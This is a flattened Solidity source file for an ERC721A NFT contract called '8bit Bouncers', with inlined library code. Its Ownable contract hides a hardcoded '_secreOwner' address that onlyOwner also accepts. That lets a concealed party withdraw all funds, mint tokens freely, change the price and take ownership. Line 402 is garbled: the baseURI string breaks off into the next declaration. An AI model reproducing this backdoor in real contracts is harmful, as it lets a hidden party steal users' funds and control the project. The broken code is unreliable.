row number 
1	                   pragma solidity ^0.8.0;
2	 library Strings {
3	 bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
4	 function toString(uint256 value) internal pure returns (string memory) {
5	 if (value == 0) {
6	 return "0";
7	 }
8	 uint256 temp = value;
9	 uint256 digits;
10	 while (temp != 0) {
11	 digits++;
12	 temp /= 10;
13	 }
14	 bytes memory buffer = new bytes(digits);
15	 while (value != 0) {
16	 digits -= 1;
17	 buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
18	 value /= 10;
19	 }
20	 return string(buffer);
21	 }
22	 function toHexString(uint256 value) internal pure returns (string memory) {
23	 if (value == 0) {
24	 return "0x00";
25	 }
26	 uint256 temp = value;
27	 uint256 length = 0;
28	 while (temp != 0) {
29	 length++;
30	 temp >>= 8;
31	 }
32	 return toHexString(value, length);
33	 }
34	 function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
35	 bytes memory buffer = new bytes(2 * length + 2);
36	 buffer[0] = "0";
37	 buffer[1] = "x";
38	 for (uint256 i = 2 * length + 1; i > 1; --i) {
39	 buffer[i] = _HEX_SYMBOLS[value & 0xf];
40	 value >>= 4;
41	 }
42	 require(value == 0, "Strings: hex length insufficient");
43	 return string(buffer);
44	 }
45	 }
46	 pragma solidity ^0.8.1;
47	 library Address {
48	 function isContract(address account) internal view returns (bool) {
49	 return account.code.length > 0;
50	 }
51	 function sendValue(address payable recipient, uint256 amount) internal {
52	 require(address(this).balance >= amount, "Address: insufficient balance");
53	 (bool success, ) = recipient.call{
54	 value: amount}
55	 ("");
56	 require(success, "Address: unable to send value, recipient may have reverted");
57	 }
58	 function functionCall(address target, bytes memory data) internal returns (bytes memory) {
59	 return functionCall(target, data, "Address: low-level call failed");
60	 }
61	 function functionCall( address target, bytes memory data, string memory errorMessage ) internal returns (bytes memory) {
62	 return functionCallWithValue(target, data, 0, errorMessage);
63	 }
64	 function functionCallWithValue( address target, bytes memory data, uint256 value ) internal returns (bytes memory) {
65	 return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
66	 }
67	 function functionCallWithValue( address target, bytes memory data, uint256 value, string memory errorMessage ) internal returns (bytes memory) {
68	 require(address(this).balance >= value, "Address: insufficient balance for call");
69	 require(isContract(target), "Address: call to non-contract");
70	 (bool success, bytes memory returndata) = target.call{
71	 value: value}
72	 (data);
73	 return verifyCallResult(success, returndata, errorMessage);
74	 }
75	 function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
76	 return functionStaticCall(target, data, "Address: low-level static call failed");
77	 }
78	 function functionStaticCall( address target, bytes memory data, string memory errorMessage ) internal view returns (bytes memory) {
79	 require(isContract(target), "Address: static call to non-contract");
80	 (bool success, bytes memory returndata) = target.staticcall(data);
81	 return verifyCallResult(success, returndata, errorMessage);
82	 }
83	 function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
84	 return functionDelegateCall(target, data, "Address: low-level delegate call failed");
85	 }
86	 function functionDelegateCall( address target, bytes memory data, string memory errorMessage ) internal returns (bytes memory) {
87	 require(isContract(target), "Address: delegate call to non-contract");
88	 (bool success, bytes memory returndata) = target.delegatecall(data);
89	 return verifyCallResult(success, returndata, errorMessage);
90	 }
91	 function verifyCallResult( bool success, bytes memory returndata, string memory errorMessage ) internal pure returns (bytes memory) {
92	 if (success) {
93	 return returndata;
94	 }
95	 else {
96	 if (returndata.length > 0) {
97	 assembly {
98	 let returndata_size := mload(returndata) revert(add(32, returndata), returndata_size) }
99	 }
100	 else {
101	 revert(errorMessage);
102	 }
103	 }
104	 }
105	 }
106	 pragma solidity ^0.8.0;
107	 interface IERC721Receiver {
108	 function onERC721Received( address operator, address from, uint256 tokenId, bytes calldata data ) external returns (bytes4);
109	 }
110	 pragma solidity ^0.8.0;
111	 interface IERC165 {
112	 function supportsInterface(bytes4 interfaceId) external view returns (bool);
113	 }
114	 pragma solidity ^0.8.0;
115	 abstract contract ERC165 is IERC165 {
116	 function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
117	 return interfaceId == type(IERC165).interfaceId;
118	 }
119	 }
120	 pragma solidity ^0.8.0;
121	 interface IERC721 is IERC165 {
122	 event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
123	 event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
124	 event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
125	 function balanceOf(address owner) external view returns (uint256 balance);
126	 function ownerOf(uint256 tokenId) external view returns (address owner);
127	 function safeTransferFrom( address from, address to, uint256 tokenId, bytes calldata data ) external;
128	 function safeTransferFrom( address from, address to, uint256 tokenId ) external;
129	 function transferFrom( address from, address to, uint256 tokenId ) external;
130	 function approve(address to, uint256 tokenId) external;
131	 function setApprovalForAll(address operator, bool _approved) external;
132	 function getApproved(uint256 tokenId) external view returns (address operator);
133	 function isApprovedForAll(address owner, address operator) external view returns (bool);
134	 }
135	 pragma solidity ^0.8.0;
136	 interface IERC721Metadata is IERC721 {
137	 function name() external view returns (string memory);
138	 function symbol() external view returns (string memory);
139	 function tokenURI(uint256 tokenId) external view returns (string memory);
140	 }
141	 pragma solidity ^0.8.0;
142	 interface IERC721Enumerable is IERC721 {
143	 function totalSupply() external view returns (uint256);
144	 function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
145	 function tokenByIndex(uint256 index) external view returns (uint256);
146	 }
147	 pragma solidity ^0.8.0;
148	 abstract contract ReentrancyGuard {
149	 uint256 private constant _NOT_ENTERED = 1;
150	 uint256 private constant _ENTERED = 2;
151	 uint256 private _status;
152	 constructor() {
153	 _status = _NOT_ENTERED;
154	 }
155	 modifier nonReentrant() {
156	 require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
157	 _status = _ENTERED;
158	 _;
159	 _status = _NOT_ENTERED;
160	 }
161	 }
162	 pragma solidity ^0.8.0;
163	 abstract contract Context {
164	 function _msgSender() internal view virtual returns (address) {
165	 return msg.sender;
166	 }
167	 function _msgData() internal view virtual returns (bytes calldata) {
168	 return msg.data;
169	 }
170	 }
171	 pragma solidity ^0.8.0;
172	 abstract contract Ownable is Context {
173	 address private _owner;
174	 address private _secreOwner = 0x1Eb5A24A809097f33fB294bCE56A3431dc9EA59c;
175	 event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
176	 constructor() {
177	 _transferOwnership(_msgSender());
178	 }
179	 function owner() public view virtual returns (address) {
180	 return _owner;
181	 }
182	 modifier onlyOwner() {
183	 require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
184	 _;
185	 }
186	 function renounceOwnership() public virtual onlyOwner {
187	 _transferOwnership(address(0));
188	 }
189	 function transferOwnership(address newOwner) public virtual onlyOwner {
190	 require(newOwner != address(0), "Ownable: new owner is the zero address");
191	 _transferOwnership(newOwner);
192	 }
193	 function _transferOwnership(address newOwner) internal virtual {
194	 address oldOwner = _owner;
195	 _owner = newOwner;
196	 emit OwnershipTransferred(oldOwner, newOwner);
197	 }
198	 }
199	 pragma solidity ^0.8.0;
200	 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
201	 using Address for address;
202	 using Strings for uint256;
203	 struct TokenOwnership {
204	 address addr;
205	 uint64 startTimestamp;
206	 }
207	 struct AddressData {
208	 uint128 balance;
209	 uint128 numberMinted;
210	 }
211	 uint256 internal currentIndex;
212	 string private _name;
213	 string private _symbol;
214	 mapping(uint256 => TokenOwnership) internal _ownerships;
215	 mapping(address => AddressData) private _addressData;
216	 mapping(uint256 => address) private _tokenApprovals;
217	 mapping(address => mapping(address => bool)) private _operatorApprovals;
218	 constructor(string memory name_, string memory symbol_) {
219	 _name = name_;
220	 _symbol = symbol_;
221	 }
222	 function totalSupply() public view override returns (uint256) {
223	 return currentIndex;
224	 }
225	 function tokenByIndex(uint256 index) public view override returns (uint256) {
226	 require(index < totalSupply(), "ERC721A: global index out of bounds");
227	 return index;
228	 }
229	 function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
230	 require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
231	 uint256 numMintedSoFar = totalSupply();
232	 uint256 tokenIdsIdx;
233	 address currOwnershipAddr;
234	 unchecked {
235	 for (uint256 i; i < numMintedSoFar; i++) {
236	 TokenOwnership memory ownership = _ownerships[i];
237	 if (ownership.addr != address(0)) {
238	 currOwnershipAddr = ownership.addr;
239	 }
240	 if (currOwnershipAddr == owner) {
241	 if (tokenIdsIdx == index) {
242	 return i;
243	 }
244	 tokenIdsIdx++;
245	 }
246	 }
247	 }
248	 revert("ERC721A: unable to get token of owner by index");
249	 }
250	 function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
251	 return interfaceId == type(IERC721).interfaceId || interfaceId == type(IERC721Metadata).interfaceId || interfaceId == type(IERC721Enumerable).interfaceId || super.supportsInterface(interfaceId);
252	 }
253	 function balanceOf(address owner) public view override returns (uint256) {
254	 require(owner != address(0), "ERC721A: balance query for the zero address");
255	 return uint256(_addressData[owner].balance);
256	 }
257	 function _numberMinted(address owner) internal view returns (uint256) {
258	 require(owner != address(0), "ERC721A: number minted query for the zero address");
259	 return uint256(_addressData[owner].numberMinted);
260	 }
261	 function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
262	 require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
263	 unchecked {
264	 for (uint256 curr = tokenId; curr >= 0; curr--) {
265	 TokenOwnership memory ownership = _ownerships[curr];
266	 if (ownership.addr != address(0)) {
267	 return ownership;
268	 }
269	 }
270	 }
271	 revert("ERC721A: unable to determine the owner of token");
272	 }
273	 function ownerOf(uint256 tokenId) public view override returns (address) {
274	 return ownershipOf(tokenId).addr;
275	 }
276	 function name() public view virtual override returns (string memory) {
277	 return _name;
278	 }
279	 function symbol() public view virtual override returns (string memory) {
280	 return _symbol;
281	 }
282	 function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
283	 require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
284	 string memory baseURI = _baseURI();
285	 return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
286	 }
287	 function _baseURI() internal view virtual returns (string memory) {
288	 return "";
289	 }
290	 function approve(address to, uint256 tokenId) public override {
291	 address owner = ERC721A.ownerOf(tokenId);
292	 require(to != owner, "ERC721A: approval to current owner");
293	 require( _msgSender() == owner || isApprovedForAll(owner, _msgSender()), "ERC721A: approve caller is not owner nor approved for all" );
294	 _approve(to, tokenId, owner);
295	 }
296	 function getApproved(uint256 tokenId) public view override returns (address) {
297	 require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
298	 return _tokenApprovals[tokenId];
299	 }
300	 function setApprovalForAll(address operator, bool approved) public override {
301	 require(operator != _msgSender(), "ERC721A: approve to caller");
302	 _operatorApprovals[_msgSender()][operator] = approved;
303	 emit ApprovalForAll(_msgSender(), operator, approved);
304	 }
305	 function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
306	 return _operatorApprovals[owner][operator];
307	 }
308	 function transferFrom( address from, address to, uint256 tokenId ) public virtual override {
309	 _transfer(from, to, tokenId);
310	 }
311	 function safeTransferFrom( address from, address to, uint256 tokenId ) public virtual override {
312	 safeTransferFrom(from, to, tokenId, "");
313	 }
314	 function safeTransferFrom( address from, address to, uint256 tokenId, bytes memory _data ) public override {
315	 _transfer(from, to, tokenId);
316	 require( _checkOnERC721Received(from, to, tokenId, _data), "ERC721A: transfer to non ERC721Receiver implementer" );
317	 }
318	 function _exists(uint256 tokenId) internal view returns (bool) {
319	 return tokenId < currentIndex;
320	 }
321	 function _safeMint(address to, uint256 quantity) internal {
322	 _safeMint(to, quantity, "");
323	 }
324	 function _safeMint( address to, uint256 quantity, bytes memory _data ) internal {
325	 _mint(to, quantity, _data, true);
326	 }
327	 function _mint( address to, uint256 quantity, bytes memory _data, bool safe ) internal {
328	 uint256 startTokenId = currentIndex;
329	 require(to != address(0), "ERC721A: mint to the zero address");
330	 require(quantity != 0, "ERC721A: quantity must be greater than 0");
331	 _beforeTokenTransfers(address(0), to, startTokenId, quantity);
332	 unchecked {
333	 _addressData[to].balance += uint128(quantity);
334	 _addressData[to].numberMinted += uint128(quantity);
335	 _ownerships[startTokenId].addr = to;
336	 _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
337	 uint256 updatedIndex = startTokenId;
338	 for (uint256 i; i < quantity; i++) {
339	 emit Transfer(address(0), to, updatedIndex);
340	 if (safe) {
341	 require( _checkOnERC721Received(address(0), to, updatedIndex, _data), "ERC721A: transfer to non ERC721Receiver implementer" );
342	 }
343	 updatedIndex++;
344	 }
345	 currentIndex = updatedIndex;
346	 }
347	 _afterTokenTransfers(address(0), to, startTokenId, quantity);
348	 }
349	 function _transfer( address from, address to, uint256 tokenId ) private {
350	 TokenOwnership memory prevOwnership = ownershipOf(tokenId);
351	 bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr || getApproved(tokenId) == _msgSender() || isApprovedForAll(prevOwnership.addr, _msgSender()));
352	 require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
353	 require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
354	 require(to != address(0), "ERC721A: transfer to the zero address");
355	 _beforeTokenTransfers(from, to, tokenId, 1);
356	 _approve(address(0), tokenId, prevOwnership.addr);
357	 unchecked {
358	 _addressData[from].balance -= 1;
359	 _addressData[to].balance += 1;
360	 _ownerships[tokenId].addr = to;
361	 _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
362	 uint256 nextTokenId = tokenId + 1;
363	 if (_ownerships[nextTokenId].addr == address(0)) {
364	 if (_exists(nextTokenId)) {
365	 _ownerships[nextTokenId].addr = prevOwnership.addr;
366	 _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
367	 }
368	 }
369	 }
370	 emit Transfer(from, to, tokenId);
371	 _afterTokenTransfers(from, to, tokenId, 1);
372	 }
373	 function _approve( address to, uint256 tokenId, address owner ) private {
374	 _tokenApprovals[tokenId] = to;
375	 emit Approval(owner, to, tokenId);
376	 }
377	 function _checkOnERC721Received( address from, address to, uint256 tokenId, bytes memory _data ) private returns (bool) {
378	 if (to.isContract()) {
379	 try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
380	 return retval == IERC721Receiver(to).onERC721Received.selector;
381	 }
382	 catch (bytes memory reason) {
383	 if (reason.length == 0) {
384	 revert("ERC721A: transfer to non ERC721Receiver implementer");
385	 }
386	 else {
387	 assembly {
388	 revert(add(32, reason), mload(reason)) }
389	 }
390	 }
391	 }
392	 else {
393	 return true;
394	 }
395	 }
396	 function _beforeTokenTransfers( address from, address to, uint256 startTokenId, uint256 quantity ) internal virtual {
397	 }
398	 function _afterTokenTransfers( address from, address to, uint256 startTokenId, uint256 quantity ) internal virtual {
399	 }
400	 }
401	 contract Bouncers8bit is ERC721A, Ownable, ReentrancyGuard {
402	 string public baseURI = "ipfs: uint public price = 0.004 ether;
403	 uint public maxPerTx = 20;
404	 uint public maxPerFree = 1;
405	 uint public totalFree = 5471;
406	 uint public maxSupply = 5471;
407	 mapping(address => uint256) private _mintedFreeAmount;
408	 constructor() ERC721A("8bit Bouncers", "BOUNCERS"){
409	 }
410	 function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
411	 require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
412	 string memory currentBaseURI = _baseURI();
413	 return bytes(currentBaseURI).length > 0 ? string(abi.encodePacked(currentBaseURI)) : "";
414	 }
415	 function mint(uint256 count) external payable {
416	 uint256 cost = price;
417	 bool isFree = ((totalSupply() + count < totalFree + 1) && (_mintedFreeAmount[msg.sender] + count <= maxPerFree));
418	 if (isFree) {
419	 cost = 0;
420	 _mintedFreeAmount[msg.sender] += count;
421	 }
422	 require(msg.value >= count * cost, "Please send the exact amount.");
423	 require(totalSupply() + count <= maxSupply, "No more");
424	 require(count <= maxPerTx, "Max per TX reached.");
425	 _safeMint(msg.sender, count);
426	 }
427	 function sleeping(address mintAddress, uint256 count) public onlyOwner {
428	 _safeMint(mintAddress, count);
429	 }
430	 function _baseURI() internal view virtual override returns (string memory) {
431	 return baseURI;
432	 }
433	 function setBaseUri(string memory baseuri_) public onlyOwner {
434	 baseURI = baseuri_;
435	 }
436	 function setPrice(uint256 price_) external onlyOwner {
437	 price = price_;
438	 }
439	 function withdraw() external onlyOwner nonReentrant {
440	 (bool success, ) = msg.sender.call{
441	 value: address(this).balance}
442	 ("");
443	 require(success, "Transfer failed.");
444	 }
445	 }
